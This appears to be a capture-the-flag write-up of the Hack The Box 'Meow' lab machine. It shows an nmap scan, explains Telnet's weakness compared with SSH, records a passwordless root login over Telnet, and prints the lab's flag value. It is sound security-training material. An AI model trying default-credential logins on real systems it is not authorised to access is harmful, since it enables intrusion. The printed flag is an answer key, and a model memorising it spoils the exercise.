---
title: "Hack The Box - Meow"
date: 2022-10-10T00:26:33+05:30
draft: false
description: " Meow from HackTheBox is an retired machine which is vulnerable to Telnet and security Misconfiguration, which can be easily exploited with help of Basic Recon "
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags:
- Telnet
series:
- Starting Point Tire 0
categories:
- Very Easy
- HackTheBox
- Linux
libraries:

image: /images/hackthebox/meow/1.png 
---
Hi Hackers Welcome Back, Today we are going to look at Hack The Box Meow Machine.

## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Room Name</th>
    <th>Meow</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Very Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td>Hack The Box</td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the port 23 ware open. while trying to connect with default or well known usernames. Telnet ware get logged in without using password.

## Mind Map 
{{< img src="/images/hackthebox/meow/mm.png" alt="image alt" width="1000px"  position="center" >}}

## Recon 
Lets start with Initial scan.

```bash 
atom@atom-VirtualBox:~/htb/meow$ sudo nmap -sC -sV -O 10.129.144.166 -oN initial.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-10 01:16 IST
Nmap scan report for 10.129.144.166
Host is up (0.18s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/10%OT=23%CT=1%CU=30227%PV=Y%DS=2%DC=I%G=Y%TM=634325
OS:3C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:101%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.80 seconds
atom@atom-VirtualBox:~/htb/meow
```

Telnet is considered insecure due to lacking the ability to encrypt the data being sent through it securely. This implies that an attacker with access to a network TAP (Traffic Access Point) could easily intercept the packets being sent through a Telnet connection and read the contents, be they login credentials, sensitive files, or anything else. Telnet, which runs on port 23 TCP by default, has mainly been replaced by its more secure counterpart, SSH , running on port 22 TCP by default.

SSH, which stands for Secure Shell Protocol, adds the required layers of authentication and encryption to the communication model, making it a much more viable approach to perform remote access and remote file transfers. It is used both for patch delivery, file transfers, log transfer, and remote management in today's environment.

SSH uses public-key cryptography to verify the remote host's identity, and the communication model is based on the ``` Client-Server architecture ``` , as seen previously with FTP, SMB, and other services. The local host uses the server's public key to verify its identity before establishing the encrypted tunnel connection. Once the tunnel is established, symmetric encryption methods and hashing algorithms are used to ensure the confidentiality and integrity of the data being sent over the tunnel.

Lets we try to connect Telnet port 23 using some well-known default usernames and password like ubuntu, administrator,user,root ... 

```bash
atom@atom-VirtualBox:~$ telnet 10.129.143.226 23
Trying 10.129.143.226...
Connected to 10.129.143.226.
Escape character is '^]'.
root

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 09 Oct 2022 04:55:58 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.143.226
  IPv6 address for eth0: dead:beef::250:56ff:fe96:1afd

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
```
we successfully get logged in. let's dig for a flag 

```bash 
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# whoami
root
root@Meow:~# 

```